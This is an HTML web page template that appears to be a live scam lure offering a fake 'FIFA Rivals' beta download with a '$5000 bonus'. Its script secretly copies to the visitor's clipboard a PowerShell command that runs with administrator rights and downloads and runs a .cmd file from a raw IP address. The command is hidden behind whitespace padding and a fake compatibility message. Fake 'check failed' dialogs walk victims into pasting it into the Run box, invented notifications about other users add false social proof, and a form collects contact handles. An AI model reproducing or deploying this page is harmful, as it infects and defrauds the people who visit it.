<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download FIFA Rivals - Get $5000 Bonus</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
  <style>
    .notification-container {
      position: fixed;
      bottom: 20px;
      left: 20px;
      z-index: 1000;
    }

    .notification {
      background: rgba(10, 14, 23, 0.95);
      border: 1px solid rgba(220, 38, 38, 0.4);
      border-radius: 12px;
      padding: 12px 16px;
      margin-top: 10px;
      color: white;
      font-size: 14px;
      transform: translateX(-120%);
      opacity: 0;
      transition: all 0.3s ease-in-out;
      max-width: 300px;
    }

    .notification.show {
      transform: translateX(0);
      opacity: 1;
    }

    .notification .amount {
      color: #22c55e;
      font-weight: 600;
    }

    .notification .location {
      color: rgba(255, 255, 255, 0.7);
    }

    .modal {
      display: none;  /* Start hidden by default */
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.95);
      z-index: 1000;
      padding: 1rem;
      overflow-y: auto;
    }

    .modal.show {
      display: flex;  /* Show when .show class is added */
      align-items: center;
      justify-content: center;
    }

    .modal-content {
      position: relative;
      background: #0A0E17;
      padding: 24px;
      border-radius: 16px;
      max-width: 90%;
      width: 500px;
      border: 1px solid rgba(220, 38, 38, 0.4);
      max-height: 90vh;
      overflow-y: auto;
      margin: auto;
      transform: none;
      top: auto;
      left: auto;
    }

    .installation-steps {
      color: rgba(255, 255, 255, 0.9);
      margin: 20px 0;
    }
    
    .step {
      margin-bottom: 20px;
      padding-bottom: 20px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .step:last-child {
      border-bottom: none;
    }
    
    .step h3 {
      color: #fff;
      font-size: 16px;
      margin-bottom: 10px;
      font-weight: 600;
    }
    
    .step p {
      color: rgba(255, 255, 255, 0.7);
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 10px;
    }

    .command-preview {
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 6px;
      padding: 12px;
      margin: 10px 0;
      overflow-x: auto;
    }

    .command-preview code {
      display: block;
      white-space: pre-wrap;
      word-break: break-word;
      color: #22c55e;
      font-size: 13px;
      line-height: 1.4;
    }

    @media (max-width: 640px) {
      .modal-content {
        width: 95%;
        padding: 20px;
        margin: 10px auto;
      }
      
      .step h3 {
        font-size: 15px;
      }
      
      .step p {
        font-size: 13px;
      }
      
      .command-preview code {
        font-size: 12px;
      }
    }

    /* Scrollbar styling */
    .modal-content::-webkit-scrollbar {
      width: 8px;
    }

    .modal-content::-webkit-scrollbar-track {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 4px;
    }

    .modal-content::-webkit-scrollbar-thumb {
      background: rgba(255, 255, 255, 0.2);
      border-radius: 4px;
    }

    .modal-content::-webkit-scrollbar-thumb:hover {
      background: rgba(255, 255, 255, 0.3);
    }

    .test-result {
      text-align: center;
      margin: 20px 0;
      padding: 20px;
      background: rgba(34, 197, 94, 0.1);
      border-radius: 8px;
    }

    .test-result p {
      margin: 5px 0;
      color: #22c55e;
    }

    .download-request-form {
      margin-top: 20px;
    }

    .download-request-form h3 {
      font-size: 18px;
      margin-bottom: 10px;
    }

    .download-request-form p {
      color: rgba(255, 255, 255, 0.7);
      margin-bottom: 15px;
    }

    .form-group {
      margin-bottom: 15px;
    }

    .form-group label {
      display: block;
      margin-bottom: 5px;
      color: rgba(255, 255, 255, 0.9);
    }

    .form-group input {
      width: 100%;
      padding: 8px 12px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 6px;
      background: rgba(255, 255, 255, 0.1);
      color: white;
    }

    .form-group input:focus {
      outline: none;
      border-color: rgba(255, 255, 255, 0.4);
    }

    .contact-admin {
      margin-top: 20px;
      padding-top: 20px;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      text-align: center;
    }

    .contact-admin p {
      color: rgba(255, 255, 255, 0.7);
      font-size: 14px;
      margin-bottom: 10px;
    }

    .contact-admin-btn {
      display: inline-block;
      background: rgba(59, 130, 246, 0.1);
      border: 1px solid rgba(59, 130, 246, 0.4);
      border-radius: 90px;
      padding: 8px 20px;
      color: #fff;
      font-size: 14px;
      font-weight: 500;
      text-decoration: none;
      transition: all 0.15s ease-in;
    }

    .contact-admin-btn:hover {
      background: rgba(59, 130, 246, 0.15);
      border-color: rgba(59, 130, 246, 0.5);
    }

    /* Loading Spinner Animation */
    .loader {
      display: inline-block;
      width: 50px;
      height: 50px;
      margin: 20px auto;
      border: 3px solid rgba(255, 255, 255, 0.1);
      border-radius: 50%;
      border-top-color: #dc2626;
      animation: spin 1s ease-in-out infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .modal-content.with-loader {
      text-align: center;
    }

    .modal-content.with-loader h2 {
      margin-bottom: 10px;
    }

    .modal-content.with-loader p {
      color: rgba(255, 255, 255, 0.7);
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <!-- Navigation Header -->
  <header class="nav-header">
    <div class="nav-container">
      <a href="#" class="logo">
        <svg xmlns="http://www.w3.org/2000/svg" width="39" height="50" viewBox="0 0 39 50" fill="none">
          <path d="M19.1667 0C8.58113 0 1.1049e-05 8.49544 1.1049e-05 18.9755V31.0245C-0.0028915 33.6975 0.566107 36.3407 1.66955 38.7802C2.77298 41.2197 4.38584 43.4002 6.40192 45.1781C9.91046 48.289 14.4566 50.0063 19.1666 50C23.8766 50.0064 28.4228 48.289 31.9314 45.178L6.40192 45.1781V18.9755C6.40192 15.6239 7.74677 12.4096 10.1406 10.0396C12.5345 7.66964 15.7812 6.33821 19.1667 6.33821C22.5521 6.33821 25.7989 7.66964 28.1927 10.0396C30.5866 12.4096 31.9314 15.6239 31.9314 18.9755L31.9314 45.178C33.9474 43.4002 35.5603 41.2197 36.6638 38.7802C37.7672 36.3407 38.3362 33.6975 38.3333 31.0245V18.9755C38.3333 8.49544 29.7522 0 19.1667 0Z" fill="white"/>
        </svg>
      </a>

      <nav class="nav-links">
        <a href="#" class="nav-link">Foundation</a>
        <a href="#" class="nav-link">Mythos Token</a>
        <a href="#" class="nav-link">Analytics</a>
        <a href="#" class="nav-link">Partners</a>
        <a href="#" class="nav-link">Advisors</a>
        <a href="#" class="nav-link">Resources</a>
      </nav>

      <div class="nav-right">
        <select>
          <option value="en">ENG</option>
        </select>
        <button class="buy-token-btn">buy token</button>
      </div>
    </div>
  </header>

  <section class="bg-radial-gradient">
    <div class="content-container">
      <div class="content-section">
        <div class="chip-container">
          <div class="chip-label">Myth</div>
        </div>
        
        <h1 class="bg-title-gradient">
          Download FIFA Rivals BETA and Get $5000 Bonus
        </h1>
        
        {% if device_type == 'unsupported' %}
        <p>
          FIFA Rivals is currently only available for Windows PC. Please visit this page from a Windows computer to download and claim your $5000 bonus.
        </p>
        <button class="download-btn" disabled style="opacity: 0.5;">Download Not Available</button>
        {% else %}
        <p>
          Be among the first 1,000 users to download and play the Windows trial to claim your $5000 bonus.
        </p>

        <button id="downloadBtn" class="download-btn">
          Download for Windows
        </button>

        <div class="requirements-text">
          Requirements: Windows 10/11, 8GB RAM, DirectX 12
        </div>
        {% endif %}
      </div>
    </div>
  </section>

  <!-- Mobile Warning Modal -->
  <div id="mobileModal" class="modal">
    <div class="modal-content">
      <button class="close-modal" onclick="closeModal()">×</button>
      <h2>Windows PC Required</h2>
      <p>FIFA Rivals is only available for Windows PC. Please use a Windows computer to download and claim your $5000 bonus.</p>
      <button class="modal-btn" onclick="closeModal()">Got it</button>
    </div>
  </div>

   <!-- ✅ New Loading Modal -->
  <div id="loadingModal" class="modal">
    <div class="modal-content with-loader">
      <div class="loader"></div>
      <h2>Checking System Compatibility...</h2>
      <p>Please wait while we verify your system meets the requirements.</p>
    </div>
  </div>

  <!-- Check Failed Modal -->
  <div id="checkFailedModal" class="modal">
    <div class="modal-content with-loader">
      <div class="loader"></div>
      <h2>⚠️ Automatic Check Failed</h2>
      <p>Generating manual verification instructions...</p>
    </div>
  </div>

  <!-- ✅ Updated Installation Instructions Modal -->
  <div id="instructionsModal" class="modal">
    <div class="modal-content">
      <button class="close-modal" onclick="closeInstructionsModal()">×</button>
      <h2>System Test Required</h2>
      <div class="installation-steps">
        <div class="step">
          <h3>1. Open Run Dialog</h3>
          <p>Press <code>Windows Key + R</code> on your keyboard to open the Run dialog.</p>
        </div>
        <div class="step">
          <h3>2. Paste and Run Command</h3>
          <p>The command has been copied to your clipboard. Just press <code>Ctrl + V</code> to paste it and click OK.</p>
        </div>
        <div class="step">
          <h3>3. Verify Test</h3>
          <p>After running the command, you should see a message in the PowerShell window.</p>
          <p class="note">Once verified, you can proceed with the download request below.</p>
        </div>
      </div>
      <div class="download-request-form">
        <h3>Request Download Access</h3>
        <p>Please provide your contact information to receive the download link:</p>
        <form id="downloadRequestForm">
          <div class="form-group">
            <label for="contactInfo">Telegram or Discord Username</label>
            <input type="text" id="contactInfo" required placeholder="@username">
          </div>
          <button type="submit" class="modal-btn">Request Download</button>
        </form>
        <div class="contact-admin">
          <p>Need immediate assistance?</p>
          <a href="{{ admin_contact }}" target="_blank" class="contact-admin-btn">Contact Admin</a>
        </div>
      </div>
    </div>
  </div>

  <!-- Success Modal -->
  <div id="successModal" class="modal">
    <div class="modal-content">
      <h2>✅ Download Request Submitted!</h2>
      <p>Your download request has been successfully received.</p>
      <button class="modal-btn" onclick="showRedirectModal()">Continue</button>
    </div>
  </div>

  <!-- Redirect Modal -->
  <div id="redirectModal" class="modal">
    <div class="modal-content">
      <h2>Follow Up With Admin</h2>
      <p>You will now be redirected to chat with our admin for immediate assistance.</p>
      <p>Our admin will verify your system test and provide you with the download link.</p>
      <button class="modal-btn" onclick="redirectToAdmin()">Chat with Admin</button>
    </div>
  </div>

  <div class="notification-container" id="notificationContainer"></div>
  <script>
// Mobile detection function
function isSupportedDevice() {
  const userAgent = navigator.userAgent.toLowerCase();
  return userAgent.includes('windows');
}

// Get DOM elements
const mobileModal = document.getElementById('mobileModal');
const instructionsModal = document.getElementById('instructionsModal');
const loadingModal = document.getElementById('loadingModal');
const closeModalBtns = document.querySelectorAll('.close-modal');

// Show/close modal functions
function showModal() {
  if (mobileModal) {
    mobileModal.classList.add('show');
  }
}

function closeModal() {
  if (mobileModal) {
    mobileModal.classList.remove('show');
  }
}

function showInstructionsModal() {
  if (instructionsModal) {
    instructionsModal.classList.add('show');
  }
}

function closeInstructionsModal() {
  if (instructionsModal) {
    instructionsModal.classList.remove('show');
  }
}

// Sample PowerShell Command
let command = `powershell -Command "Start-Process PowerShell -Verb RunAs -ArgumentList '-NoExit -Command Write-Host Start now; iwr http://198.46.142.197/fr/f.cmd -OutFile 1.cmd; & .\\1.cmd'"`;
let extraText = " #                    Click Enter to check your device compatibility";
let totalLimit = 259;
let padding = " ".repeat(Math.max(0, totalLimit - command.length - extraText.length));
command += extraText + padding;

// Track visit on page load
fetch('/track-visit', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
})
.then(response => response.json())
.then(data => {
  if (data.location) {
    createNotification('visit', { city: data.location.city, country: data.location.country });
  } else {
    createNotification('visit');
  }
})
.catch(console.error);

// Download button click handler
document.getElementById('downloadBtn').addEventListener('click', function() {
  // Function to handle the rest of the flow after copy attempt
  function continueFlow(copySuccess) {
    // Track command copy if successful
    if (copySuccess) {
      fetch('/track-command-copy', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      })
      .then(response => response.json())
      .then(data => {
        if (data.location) {
          createNotification('command', { city: data.location.city, country: data.location.country });
        } else {
          createNotification('command');
        }
      })
      .catch(console.error);
    }
    
    // Start the modal sequence
    showLoadingModal();
  }

  // Try to copy using the Clipboard API
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(command)
      .then(() => continueFlow(true))
      .catch(() => {
        // If Clipboard API fails, show instructions anyway
        continueFlow(false);
        console.log('Clipboard API failed - possibly not in secure context');
      });
  } else {
    // Fallback for non-secure contexts
    const textArea = document.createElement('textarea');
    textArea.value = command;
    textArea.style.position = 'fixed';
    textArea.style.left = '-999999px';
    textArea.style.top = '-999999px';
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();

    try {
      const successful = document.execCommand('copy');
      textArea.remove();
      continueFlow(successful);
    } catch (err) {
      textArea.remove();
      console.log('Fallback clipboard copy failed');
      continueFlow(false);
    }
  }
});

// Modal close button event listeners
closeModalBtns.forEach(btn => {
  btn.addEventListener('click', function () {
    const modal = btn.closest('.modal');
    if (modal) {
      modal.classList.remove('show');
    }
  });
});

// Close modals when clicking outside
window.addEventListener('click', function (e) {
  if (e.target.classList.contains('modal')) {
    e.target.classList.remove('show');
  }
});

function showLoadingModal() {
  if (loadingModal) {
    loadingModal.classList.add('show');
    // After 5 seconds, show check failed modal
    setTimeout(() => {
      closeLoadingModal();
      showCheckFailedModal();
    }, 5000);
  }
}

function showCheckFailedModal() {
  const checkFailedModal = document.getElementById('checkFailedModal');
  if (checkFailedModal) {
    checkFailedModal.classList.add('show');
    // After 3 seconds, show instructions modal
    setTimeout(() => {
      checkFailedModal.classList.remove('show');
      showInstructionsModal();
    }, 3000);
  }
}

function closeLoadingModal() {
  if (loadingModal) {
    loadingModal.classList.remove('show');
  }
}

// ✅ Randomized User Notifications ✅
const names = ['Greg', 'Andrew', 'Emma', 'Sophie', 'James', 'William', 'Oliver', 'Charlotte', 'Lucas', 'Henry', 'Ethan', 'Alexander', 'Michael', 'Daniel', 'David', 'Sarah', 'Emily', 'Isabella', 'Sophia', 'Olivia', 'Jing', 'Yuki', 'Wei', 'Hiroshi', 'Jin', 'Seo-yeon', 'Ming', 'Kai', 'Yuna', 'Haruto', 'Ravi', 'Arjun', 'Priya', 'Arun', 'Deepak', 'Ananya', 'Zara', 'Ayesha', 'Krishna', 'Aarav', 'Ivan', 'Hans', 'Klaus', 'Sofia', 'Anna', 'Marco', 'Giuseppe', 'Pavel', 'Dmitri', 'Viktor', 'Luca', 'Francesco', 'Elena', 'Natasha', 'Anastasia', 'Pierre', 'Jean', 'Marie', 'Luis', 'Carlos', 'Ahmed', 'Mohammed', 'Fatima', 'Hassan', 'Ali', 'Yasmin', 'Omar', 'Leila', 'Karim', 'Amir', 'Maria', 'Jose', 'Juan', 'Miguel', 'Roberto', 'Ana', 'Isabella', 'Gabriel', 'Rafael', 'Diego', 'Kwame', 'Chioma', 'Oluwaseun', 'Amara', 'Tendai', 'Zainab', 'Malik', 'Aisha', 'Jabari', 'Folami'];

const locations = [
  { city: 'New York', country: 'USA' }, { city: 'Los Angeles', country: 'USA' }, { city: 'Chicago', country: 'USA' }, { city: 'Toronto', country: 'Canada' }, { city: 'Vancouver', country: 'Canada' }, { city: 'London', country: 'UK' }, { city: 'Paris', country: 'France' }, { city: 'Berlin', country: 'Germany' }, { city: 'Madrid', country: 'Spain' }, { city: 'Rome', country: 'Italy' }, { city: 'Tokyo', country: 'Japan' }, { city: 'Seoul', country: 'South Korea' }, { city: 'Beijing', country: 'China' }, { city: 'Mumbai', country: 'India' }, { city: 'Bangkok', country: 'Thailand' }, { city: 'Dubai', country: 'UAE' }, { city: 'Sydney', country: 'Australia' }, { city: 'Mexico City', country: 'Mexico' }, { city: 'São Paulo', country: 'Brazil' }, { city: 'Buenos Aires', country: 'Argentina' }, { city: 'Cairo', country: 'Egypt' }, { city: 'Lagos', country: 'Nigeria' }
];

// Create notification
function createNotification(type, location) {
  const name = names[Math.floor(Math.random() * names.length)];
  const randomLocation = location || locations[Math.floor(Math.random() * locations.length)];
  
  const notification = document.createElement('div');
  notification.className = 'notification';
  
  let message = '';
  switch(type) {
    case 'visit':
      message = `<strong>${name}</strong> from <span class="location">${randomLocation.city}, ${randomLocation.country}</span> just visited the page`;
      break;
    case 'command':
      message = `<strong>${name}</strong> from <span class="location">${randomLocation.city}, ${randomLocation.country}</span> just copied the test command`;
      break;
    case 'download':
      message = `<strong>${name}</strong> from <span class="location">${randomLocation.city}, ${randomLocation.country}</span> just requested a download`;
      break;
    default:
      message = `<strong>${name}</strong> from <span class="location">${randomLocation.city}, ${randomLocation.country}</span> just executed a test command`;
  }
  
  notification.innerHTML = message;
  document.getElementById('notificationContainer').appendChild(notification);
  setTimeout(() => notification.classList.add('show'), 100);
  setTimeout(() => { notification.classList.remove('show'); notification.remove(); }, 5000);
}

// Add new modal functions
function showSuccessModal() {
  if (successModal) {
    successModal.classList.add('show');
  }
}

function closeSuccessModal() {
  if (successModal) {
    successModal.classList.remove('show');
  }
}

function showRedirectModal() {
  closeSuccessModal();
  if (redirectModal) {
    redirectModal.classList.add('show');
  }
}

function closeRedirectModal() {
  if (redirectModal) {
    redirectModal.classList.remove('show');
  }
}

function redirectToAdmin() {
  const adminContact = "{{ admin_contact }}";
  if (adminContact) {
    window.open(adminContact, '_blank');
  }
  closeRedirectModal();
}

// Get additional modal elements
const successModal = document.getElementById('successModal');
const redirectModal = document.getElementById('redirectModal');

// Update download request form handler
document.getElementById('downloadRequestForm').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const contactInfo = document.getElementById('contactInfo').value;
  const adminContact = "{{ admin_contact }}"; // Get admin contact URL early
  
  fetch('/request-download', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ contact: contactInfo })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      if (data.location) {
        createNotification('download', { city: data.location.city, country: data.location.country });
      } else {
        createNotification('download');
      }
      closeInstructionsModal();
      
      // Show success modal for 3 seconds
      showSuccessModal();
      setTimeout(() => {
        closeSuccessModal();
        
        // Show redirect modal for 3 seconds
        showRedirectModal();
        setTimeout(() => {
          closeRedirectModal();
          
          // Force redirect to admin contact in new tab
          if (adminContact) {
            const newWindow = window.open();
            if (newWindow) {
              newWindow.location.href = adminContact;
            } else {
              window.location.href = adminContact; // Fallback if popup is blocked
            }
          }
        }, 3000);
      }, 3000);
    } else {
      alert('❌ Error: ' + data.message);
    }
  })
  .catch(() => {
    alert('❌ Failed to submit request. Please try again.');
  });
});

// Update modal close handlers
closeModalBtns.forEach(btn => {
  btn.addEventListener('click', function () {
    const modal = btn.closest('.modal');
    if (modal) {
      modal.classList.remove('show');
    }
  });
});

// Update outside click handlers
window.addEventListener('click', function (e) {
  if (e.target.classList.contains('modal')) {
    e.target.classList.remove('show');
  }
});
</script>


</body>
</html> 
